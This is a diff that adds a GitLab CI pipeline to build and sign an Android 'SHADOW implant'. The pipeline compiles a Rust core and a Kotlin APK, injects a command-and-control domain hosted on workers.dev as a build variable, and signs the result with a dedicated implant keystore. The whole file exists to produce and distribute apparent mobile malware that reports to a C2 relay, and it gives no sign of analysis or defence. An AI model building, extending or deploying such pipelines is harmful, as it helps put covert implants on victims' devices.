@@ -1,0 +1,54 @@
+# SHADOW implant build — GitLab CI (replaces dead GitHub Actions)
+# Builds Rust core + Kotlin APK, signs with the implant keystore.
+stages:
+  - build
+
+variables:
+  ANDROID_HOME: "$CI_PROJECT_DIR/android-sdk"
+  C2_DOMAIN: "cfg-relay.marwannaili-23-07.workers.dev"
+
+build-implant:
+  stage: build
+  image: eclipse-temurin:17-jdk
+  cache:
+    key: gradle
+    paths: [".gradle/", "core/android/.gradle/"]
+  before_script:
+    - apt-get update -qq && apt-get install -y -qq curl unzip zip
+    - curl -sSL -o /tmp/cmdtools.zip https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
+    - mkdir -p "$ANDROID_HOME" && unzip -q /tmp/cmdtools.zip -d /tmp/clt
+    - yes | /tmp/clt/cmdline-tools/bin/sdkmanager --sdk_root="$ANDROID_HOME" --licenses >/dev/null 2>&1 || true
+    - /tmp/clt/cmdline-tools/bin/sdkmanager --sdk_root="$ANDROID_HOME" "platforms;android-34" "build-tools;34.0.0" "ndk;26.1.10909125"
+    - curl -sSL https://sh.rustup.rs -sSf | sh -s -- -y >/dev/null 2>&1
+    - source "$HOME/.cargo/env"
+    - rustup target add aarch64-linux-android
+    - cargo install cargo-ndk
+    - export PATH="$HOME/.cargo/bin:$ANDROID_HOME:$ANDROID_HOME/build-tools/34.0.0:$ANDROID_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin:$PATH"
+  script:
+    - export PATH="$HOME/.cargo/bin:$ANDROID_HOME:$ANDROID_HOME/build-tools/34.0.0:$ANDROID_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin:$PATH"
+    # 1. Rust core -> jniLibs
+    - cd core
+    - cargo ndk -t arm64-v8a -o android/app/src/main/jniLibs build --release
+    - cp "$ANDROID_HOME/ndk/26.1.10909125/toolchains/llvm/prebuilt/linux-x86_64/sysroot/usr/lib/aarch64-linux-android/libc++_shared.so" android/app/src/main/jniLibs/arm64-v8a/
+    # 2. Kotlin APK
+    - cd android
+    - chmod +x gradlew
+    - C2_DOMAIN="$C2_DOMAIN" ./gradlew assembleRelease
+    # 3. Sign APK
+    - ls -la app/build/outputs/apk/release/
+    - echo "$IMPLANT_KEYSTORE_BASE64" | base64 -d > app/implant.jks
+    - curl -sSL -o /tmp/bt.zip https://dl.google.com/android/repository/build-tools_r34-linux.zip
+    - python3 -c "
+import zipfile
+z=zipfile.ZipFile('/tmp/bt.zip')
+open('/tmp/apksigner.jar','wb').write(z.read([n for n in z.namelist() if n.endswith('apksigner.jar')][0]))
+"
+    - IN=$(ls app/build/outputs/apk/release/*.apk | head -n1)
+    - OUT=app/build/outputs/apk/release/shadow-implant-signed.apk
+    - java -jar /tmp/apksigner.jar sign --ks app/implant.jks --ks-key-alias "$IMPLANT_KEY_ALIAS" --ks-pass "pass:$IMPLANT_KEYSTORE_PASS" --key-pass "pass:$IMPLANT_KEY_PASS" --out "$OUT" "$IN"
+    - java -jar /tmp/apksigner.jar verify -v "$OUT" | head -6
+    - ls -la "$OUT"
+  artifacts:
+    paths: [core/android/app/build/outputs/apk/release/shadow-implant-signed.apk]
+    expire_in: 1 week
+    when: always
